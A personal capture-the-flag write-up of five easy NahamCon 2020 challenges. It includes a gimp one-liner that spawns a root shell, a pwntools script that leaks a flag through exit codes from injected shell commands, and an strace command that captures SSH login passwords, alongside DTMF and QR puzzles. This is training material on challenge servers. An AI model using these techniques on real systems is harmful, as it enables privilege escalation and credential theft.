# NahamCon CTF 2020

## The Scraps

I rarely do write-ups for small 1-2 line solves, but then all that history gets lost and is hard to find later when I need it, so, here's a rundown of some of the easy ones, you know, for the points.

> All I could find, post CTF on my <strike>HD</strike> SSD.


### Glimpse

```
125

There's not a lot to work with on this server. But there is something...

Connect here:
ssh -p 50027 user@jh2i.com # password is 'userpass'
```

Google for GTFOBins:

```bash
$ gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
(gimp:25615): GLib-GObject-WARNING **: 18:26:38.010: g_object_set_is_valid_property: object class 'GeglConfig' has no property named 'cache-size'
Failed to parse tag cache: No such file or directory
GIMP-Error: Could not open '/home/user/.gimp-2.8/pluginrc' for writing: Read-only file system
GIMP-Warning: Unable to open a test swap file.
To avoid data loss, please check the location and permissions of the swap directory defined in your Preferences (currently "/home/user/.gimp-2.8").
# cd /root
# ls -l
total 4
-r-------- 1 root root 44 Jun  4 18:53 flag.txt
# cat flag.txt
flag{just_need_a_glimpse_of_the_flag_please}
```

### Awkward

```
125

No output..? Awk-o-taco.

Connect here:
nc jh2i.com 50025
```

Using exit codes to leak info.  Ok, more than 1-2 lines, but still easy, and will never use again:

```python
#!/usr/bin/python3

from pwn import *

p = remote('jh2i.com', 50025)
s = 'cat $(find . -name flag.txt) | grep flag{'
dots = 0

while True:
    ss = s + dots * '.'
    ss += '}'
    p.sendline(ss)
    _ = p.recvline().strip()
    if _[0] == ord('0'):
        break
    dots += 1

print('flag length',dots)
letters = '_abcdefghijklmnopqrstuvwxyz-0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ.'

for i in range(dots):
    for j in letters:
        ss = s + j
        p.sendline(ss)
        _ = p.recvline().strip()
        if _[0] == ord('0'):
            s += j
            print('flag',s)
            break

print('flag',s + '}')
```


### SSH Logger

```
175

Someone keeps logging in to this server... can you find their password?

Connect here:
ssh -p 50029 root@jh2i.com # password is 'root'
```

Oldskool, Google for _how to read ssh passwords with strace_:

```bash
# strace -f -p 1 2>&1 | grep read | grep flag
[pid 24395] read(6, "\10\0\0\0\4flag", 9) = 9
[pid 24395] read(6, "\f\0\0\0\33flag{okay_so_that_was_cool}", 32) = 32
```


### Beep Boop

```
50

That must be a really long phone number... right?

Download the file below.
```

I love DTMF.  It is [central to hacker history](https://www.amazon.com/gp/product/080212061X).  It is completely useless to have in CTFs, but it is [important hacker history](https://www.amazon.com/gp/product/080212061X), and I welcome any retro challenge.

> If you didn't get the hint, read this [book](https://www.amazon.com/gp/product/080212061X)!

Get a Ubuntu 16.04 container for this:

```bash
# multimon -a DTMF -t wav flag.wav | grep DTMF: | awk '{print $NF}' | xargs | sed 's/ //g'
46327402297754110981468069185383422945309689772058551073955248013949155635325
# python3
>>> bytes.fromhex(hex(46327402297754110981468069185383422945309689772058551073955248013949155635325)[2:])
b'flag{do_you_speak_the_beep_boop}'
```


### Big Bird

```
100

Big Bird is communicating with us in a whole new way! But... how?

Connect here:
https://twitter.com/BigBird01558595
```

_Groan_

2-liner:

```bash
GetOldTweets3 --username "BigBird01558595" --maxtweets 1000
$ zbarimg <(cat output_got.csv | awk -F, '{print $7}' | awk -F\" '{print $2}' | awk -F\# '{print $2}' | sort -n | awk '{print $NF}' | xargs printf "%02x" | xxd -r -p) 2>&1 | grep QR | awk -F: '{print $NF}'
flag{big_bird_tweets_big_tweets}
```

At least I learned about `GetOldTweets3`.
